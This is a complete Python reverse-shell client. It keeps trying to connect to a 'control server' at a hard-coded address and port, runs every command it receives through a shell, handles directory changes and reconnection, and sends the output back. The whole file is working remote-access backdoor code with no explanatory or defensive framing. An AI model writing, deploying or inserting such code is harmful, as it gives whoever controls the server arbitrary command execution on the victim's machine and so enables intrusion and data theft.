import os
import socket
import subprocess
from time import sleep


the_host = '10.0.0.213'
the_port = 6668


def connect_to_server():
    global the_host
    global the_port
    the_sock = False

    while True:
        the_sock = socket.socket()
        try:
            the_sock.connect((the_host, the_port))
            print('Connected to server...')
            break
        except socket.error as the_error_message:
            print('Waiting for control server {}:{} {}'.format(the_host, the_port, the_error_message))
            sleep(5)

    return the_sock


sock = connect_to_server()

if sock:
    while True:
        try:
            data = sock.recv(1024)
        except socket.error as error_message:
            print('Something bad happened, retrying connection:', error_message)
            sock = connect_to_server()
            continue

        # Continue looping if there is no data.
        if len(data) < 1:
            continue

        if data.decode('utf-8') == 'quit':
            # The control server is shutting down, so we should shutdown
            # then start trying to reconnect for the next session.
            sock.close()
            print('Control server disconnected...')
            print('Waiting for server...')
            sock = connect_to_server()
            continue

        if data[:2].decode('utf-8') == 'cd':
            # Change directory.
            os.chdir(data[3:].decode('utf-8'))

        # Process the command.
        cmd = subprocess.Popen(
            data[:].decode('utf-8'),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        # Compile the output.
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')

        # Send the output back to control server.
        sock.send(str.encode(output_str + str(os.getcwd()) + '> '))

